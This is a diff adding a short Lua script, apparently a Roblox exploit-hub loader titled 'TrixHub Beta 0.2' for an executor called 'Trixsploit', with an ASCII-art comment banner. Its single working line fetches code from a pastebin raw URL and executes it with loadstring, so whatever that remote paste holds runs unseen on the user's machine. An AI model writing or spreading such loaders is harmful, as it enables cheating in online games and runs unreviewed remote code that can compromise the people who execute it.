@@ -1,0 +1,16 @@
+--[[
+TrixHub Beta 0.2
+By RunDTM special for Trixsploit
+
+____                                                         _______         __________
+|         \       |              |         |\            |        |               \                   |                   |\            /|
+|         |       |              |         |  \          |        |               |                   |                   |  \        /  |
+|____/       |              |         |    \        |        |               |                   |                   |    \    /    |
+| \               |              |         |      \      |        |               |                   |                   |      \/      |
+|   \             |              |         |        \    |        |               |                   |                   |              |
+|     \           |              |         |          \  |        |               |                   |                   |              |
+|       \         \______/          |           \|         |______/                    |                   |              |
+
+]]
+
+loadstring(game:HttpGet("https://pastebin.com/raw/SKVeCDB7"))();
